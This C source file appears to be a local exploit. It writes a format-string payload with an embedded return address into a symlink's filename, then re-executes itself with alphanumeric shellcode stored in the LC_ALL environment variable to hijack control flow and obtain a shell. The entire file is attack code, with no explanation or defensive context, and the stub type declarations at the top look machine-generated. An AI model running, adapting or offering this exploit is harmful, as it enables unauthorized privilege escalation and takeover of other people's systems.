
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 unsigned long RETADDR ;
 int execl (char*,char*,char*,int *) ;
 int exit (int) ;
 int fprintf (int ,char*,char*) ;
 int perror (char*) ;
 int printf (char*) ;
 scalar_t__ putenv (char*) ;
 int stderr ;
 int strlen (char*) ;
 unsigned long strtoul (char*,int *,int ) ;
 scalar_t__ symlink (char*,char*) ;

int main(int ac, char **av)
{
    char sting[] = "./[<%2009xAAAABBB";



    char *venom = "LC_ALL="
        "T[fhBOfXf5B@f1ChjAX4APPZHf1Chfh/xh/tmpT[RSTYjOX4D2p";

    if (ac != 1 && ac != 2) {
        fprintf(stderr, "usage: %s [return address]\n", av[0]);
        exit(1);
    }

    if (ac == 2 && av[1][0] == '-') {
        printf("done\n");
        exit(0);
    }
    else if (ac == 2 && av[1][0] == '+') {
        if (putenv(venom)) {
            perror("putenv");
            exit(1);
        }
        execl(av[0], av[0], "-", ((void*)0));
    }
    else {
        *(unsigned long *)(&sting[strlen(sting) - 4 - 3])
            = ac == 1 ? RETADDR: strtoul(av[1], ((void*)0), 0);
        if (symlink(av[0], sting)) {
            perror("symlink");
            exit(1);
        }
        execl(sting, sting, "+", ((void*)0));
    }

    perror("execl");
    exit(1);
}
